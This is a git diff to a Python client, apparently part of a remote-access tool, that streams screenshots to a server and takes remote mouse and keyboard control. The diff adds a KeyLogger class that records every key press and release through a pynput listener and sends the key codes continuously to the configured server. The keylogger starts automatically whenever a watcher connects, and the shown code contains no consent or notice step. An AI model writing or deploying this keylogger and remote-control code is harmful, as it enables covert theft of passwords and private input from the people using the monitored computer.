@@ -1,19 +1,22 @@
-from Base.constants import ImageSendModes, ControlEvents, Reasons, \
-    Actions, ClientTypes, ControlDevice
+from Base.constants import ImageSendModes, DeviceEvents, Reasons, \
+    ClientTypes, ControlDevice
 from Base.settings import ACKNOWLEDGEMENT_ITERATION, \
     SERVER_PORT, SERVER_ADDRESS, IMAGE_SEND_MODE
 from Base.socket_base import Socket, Config
+import itertools as it
 import logging
-import numpy as np
+from math import log
 from PIL import Image, ImageChops
 from pynput.mouse import Controller as MouseController, Button as MouseButton
-from pynput.keyboard import Controller as KeyController, KeyCode
+from pynput.keyboard import Controller as KeyController, Key, KeyCode, \
+    Listener as KeyboardListener
 from queue import Queue, Empty
+from random import random
 import subprocess
 from threading import Thread
 from time import sleep, time
 import traceback
-from typing import List, Tuple
+from typing import List, Tuple, Union
 
 
 try:
@@ -57,6 +60,7 @@ class Target(Socket):
             self.controlling = self.screen_reader.send_screenshot(i)
             i %= ACKNOWLEDGEMENT_ITERATION
         self.screen_reader.stop()
+        self.keylogger.stop()
         logging.info("Stoping screen reader client")
 
     def start_controller(self):
@@ -91,6 +95,9 @@ class Target(Socket):
         """
         self.control_thread = Thread(target=self.start_controller)
         self.control_thread.start()
+        self.keylogger = KeyLogger()
+        self.keylogger_thread = Thread(target=self.keylogger.start)
+        self.keylogger_thread.start()
         self.start_screen_reader()
 
     def run(self):
@@ -98,16 +105,20 @@ class Target(Socket):
             Run a loop which connects to the server and waits for watcher 
             clients.
             Stops if another client for this target is already connected
+
+            TODO: Support selective watching: Do not start all the readers,
+                controllers and listeners at once. Start only the ones requested
+                by the watcher.
         """
         while self.running:
             try:
                 self.socket.close()
                 self.socket = self.new_socket()
                 logging.info("Connecting")
-                self.socket.connect(self.addr)
+                self.connect()
                 logging.info("Connected")
-                # After the connection is established send Hi
-                self.send_data(b"Hi!")
+                # After the connection is established send type
+                self.send_data(ClientTypes.TARGET)
                 # Send unique code
                 self.send_data(self.config.code.encode(self.FORMAT))
                 data = b"WAIT"
@@ -155,14 +166,13 @@ class Target(Socket):
         """
         self.running = False
         self.controlling = False
-        if "controller" in dir(self):
+        if hasattr(self, "controller"):
             self.controller.stop()
+        if hasattr(self, "keylogger"):
+            self.keylogger.stop()
 
 
 class ScreenReader(Socket):
-    # TODO:
-    # 1. Send the image as a diff and not the whole data
-    # 2. implement fallback from mss to gi (for linux) and from gi to PIL
 
     def __init__(self) -> None:
         super().__init__(SERVER_ADDRESS, SERVER_PORT)
@@ -175,7 +185,7 @@ class ScreenReader(Socket):
             initiate connections and return True if connection 
             was established else False
         """
-        self.socket.connect(self.addr)
+        self.connect()
         self.send_data(ClientTypes.TARGET_SCREEN_READER)
         self.send_data(self.config.code.encode(self.FORMAT))
         data = self.recv_data()
@@ -337,7 +347,7 @@ class Controller(Socket):
             Initiate connection to server. Returns True if 
             connection is successfull else False.
         """
-        self.socket.connect(self.addr)
+        self.connect()
         self.send_data(ClientTypes.TARGET_CONTROLLER)
         self.send_data(self.config.code.encode(self.FORMAT))
         data = self.recv_data()
@@ -381,6 +391,10 @@ class Controller(Socket):
 
 
 class Keyboard(object):
+    """
+        TODO: Release all pressed keys (if still remained pressed)
+        when exiting
+    """
 
     def __init__(self) -> None:
         self.key_controller = KeyController()
@@ -390,9 +404,9 @@ class Keyboard(object):
         if self.events.empty():
             return
         ev_type, vk = self.events.get()
-        if ev_type == ControlEvents.KEY_DOWN:
+        if ev_type == DeviceEvents.KEY_DOWN:
             self.key_controller.press(KeyCode.from_vk(vk))
-        elif ev_type == ControlEvents.KEY_UP:
+        elif ev_type == DeviceEvents.KEY_UP:
             self.key_controller.release(KeyCode.from_vk(vk))
 
 
@@ -426,9 +440,9 @@ class Mouse(object):
             (1-rel_pos[1])*self.screen_size[1]
         )
         self.mouse_controller.position = pos
-        if ev_type == ControlEvents.MOUSE_DOWN:
+        if ev_type == DeviceEvents.MOUSE_DOWN:
             self.mouse_controller.press(self.btns[btn])
-        elif ev_type == ControlEvents.MOUSE_UP:
+        elif ev_type == DeviceEvents.MOUSE_UP:
             self.mouse_controller.release(self.btns[btn])
 
     def get_events(self):
@@ -462,6 +476,97 @@ class Mouse(object):
             res, _ = grep.communicate()
             resolution = res.split()[0].decode("utf-8")
             return [int(i) for i in resolution.split('x')]
+
+
+class KeyLogger(Socket):
+    """
+        send all keys pressed to the server`
+    """
+
+    def __init__(self) -> None:
+        super().__init__(SERVER_ADDRESS, SERVER_PORT)
+
+        self.config = Config()
+        self.listener = KeyboardListener(on_press=self.on_key_press,
+                                         on_release=self.on_key_release)
+        self.vks: Queue[Tuple[int, int]] = Queue()
+
+    def on_key_press(self, key: Union[Key, KeyCode, None]):
+        if isinstance(key, Key):
+            key = key.value
+        self.vks.put((DeviceEvents.KEY_DOWN, key.vk))
+
+    def on_key_release(self, key: Union[Key, KeyCode, None]):
+        if isinstance(key, Key):
+            key = key.value
+        self.vks.put((DeviceEvents.KEY_UP, key.vk))
+
+    def start(self):
+        """
+            Start the keylogger. Connect to the server.
+        """
+
+        logging.info("Starting keylogger")
+
+        try:
+            self.connect()
+        except (ConnectionRefusedError, TimeoutError):
+            logging.fatal("Cannot connect to server. Aborting")
+            self.stop()
+            return
+
+        try:
+            self.send_data(ClientTypes.TARGET_KEYLOGGER)
+            self.send_data(self.config.code.encode(self.FORMAT))
+            self.recv_data()  # receive b"OK"
+        except (BrokenPipeError, ConnectionResetError):
+            logging.fatal("Connection to server closed unexpectedly. Aborting")
+            self.stop()
+            return
+
+        self.running = True
+        self.listener.start()
+        self.run()
+
+    def run(self):
+        """
+            Send the logged keys to the server.
+        """
+        while self.running:
+            try:
+                if self.vks.empty():
+                    sleep(0.1)
+                    continue
+
+                vks = b"\0".join(map(
+                    lambda x: x.to_bytes(int(log(x, 256)) + 1, "big"),
+                    it.chain(*self.get_keys())
+                ))
+                logging.debug(vks)
+                self.send_data(vks)
+            except (ConnectionResetError, BrokenPipeError):
+                logging.info("Stoping Keyboard Controller")
+                break
+
+        self.stop()
+
+    def get_keys(self) -> Tuple[Tuple[int, int]]:
+        """
+            Fetches requests from queue and returns them as a list
+        """
+        keys = []
+        while not self.vks.empty():
+            try:
+                keys.append(self.vks.get_nowait())
+            except Empty:
+                break
+        return tuple(keys)
+
+    def stop(self):
+        self.running = False
+        self.socket.close()
+        self.listener.stop()
+
 
 def check_update():
     """
